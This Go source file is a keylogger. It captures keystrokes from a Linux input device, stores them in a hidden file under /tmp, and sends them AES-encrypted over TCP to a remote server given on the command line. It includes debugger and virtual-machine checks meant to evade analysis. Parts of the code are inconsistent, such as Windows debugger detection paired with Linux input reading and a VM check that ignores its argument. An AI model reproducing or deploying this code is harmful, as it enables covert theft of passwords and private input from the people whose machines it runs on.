package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"io"
	"log"
	"math/big"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"github.com/MarinX/keylogger"
)

var key = []byte(generateRandomKey())

func main() {
    if len(os.Args) != 3 {
        fmt.Printf("Usage: %s <SERVER_IP> <SERVER_PORT>\n", os.Args[0])
        os.Exit(1)
    }

    if isBeingDebugged() || isRunningInVM() {
        fmt.Println("Debugger or VM detected. Exiting.")
        os.Exit(1)
    }

    serverIP := os.Args[1]
    serverPort := os.Args[2]

    go exfiltrateKeystrokes(serverIP, serverPort)

    keyboard, err := keylogger.New("/dev/input/event0") // Adjust the input event path accordingly
    if err != nil {
        log.Fatalf("Failed to initialize keylogger: %v", err)
    }
    events := keyboard.Read()

    logFile, err := os.OpenFile("/tmp/.keylogs.txt", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0666)
    if err != nil {
        log.Fatal(err)
    }
    defer logFile.Close()

    for e := range events {
        if e.Type == keylogger.EvKey && e.KeyPress() {
            log.Println(e.KeyString())
            logFile.WriteString(e.KeyString() + "\n")
        }
    }
}

func exfiltrateKeystrokes(serverIP, serverPort string) {
    for {
        conn, err := net.Dial("tcp", serverIP+":"+serverPort)
        if err != nil {
            fmt.Println("Connection error:", err)
            time.Sleep(10 * time.Second)
            continue
        }

        logFile, err := os.Open("/tmp/.keylogs.txt")
        if err != nil {
            fmt.Println("Error opening log file:", err)
            conn.Close()
            time.Sleep(10 * time.Second)
            continue
        }

        buffer := make([]byte, 1024)
        for {
            n, err := logFile.Read(buffer)
            if err != nil && err != io.EOF {
                fmt.Println("Error reading log file:", err)
                break
            }
            if n == 0 {
                time.Sleep(5 * time.Second)
                continue
            }

            encryptedData, _ := encrypt(string(buffer[:n]))
            conn.Write([]byte(encryptedData + "\n"))
        }

        logFile.Close()
        conn.Close()
    }
}

func encrypt(text string) (string, error) {
    block, err := aes.NewCipher(key)
    if err != nil {
        return "", err
    }

    gcm, err := cipher.NewGCM(block)
    if err != nil {
        return "", err
    }

    nonce := make([]byte, gcm.NonceSize())
    if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
        return "", err
    }

    ciphertext := gcm.Seal(nonce, nonce, []byte(text), nil)
    return base64.StdEncoding.EncodeToString(ciphertext), nil
}

func decrypt(text string) (string, error) {
    data, err := base64.StdEncoding.DecodeString(text)
    if err != nil {
        return "", err
    }

    block, err := aes.NewCipher(key)
    if err != nil {
        return "", err
    }

    gcm, err := cipher.NewGCM(block)
    if err != nil {
        return "", err
    }

    nonceSize := gcm.NonceSize()
    if len(data) < nonceSize {
        return "", fmt.Errorf("ciphertext too short")
    }

    nonce, ciphertext := data[:nonceSize], data[nonceSize:]
    plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
    if err != nil {
        return "", err
    }

    return string(plaintext), nil
}

func generateRandomKey() string {
    const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    key := make([]byte, 32)
    for i := range key {
        n, _ := rand.Int(rand.Reader, big.NewInt(int64(len(letters))))
        key[i] = letters[n.Int64()]
    }
    return string(key)
}

func isBeingDebugged() bool {
    var isDebuggerPresent bool
    kernel32 := syscall.NewLazyDLL("kernel32.dll")
    procIsDebuggerPresent := kernel32.NewProc("IsDebuggerPresent")
    ret, _, _ := procIsDebuggerPresent.Call(uintptr(unsafe.Pointer(&isDebuggerPresent)))
    return ret != 0
}

func isRunningInVM() bool {
    if runtime.GOOS != "windows" {
        return false
    }

    vmIndicators := []string{
        "VMware",
        "VirtualBox",
        "QEMU",
        "Hyper-V",
        "KVM",
        "Xen",
    }

    for _, indicator := range vmIndicators {
        if isIndicatorPresent(indicator) {
            return true
        }
    }
    return false
}

func isIndicatorPresent(indicator string) bool {
    cmd := exec.Command("powershell", "-Command", fmt.Sprintf("Get-WmiObject Win32_ComputerSystem | Select-Object -ExpandProperty Manufacturer"))
    output, err := cmd.Output()
    if err != nil {
        return false
    }
    return strings.Contains(string(output), indicator)
}
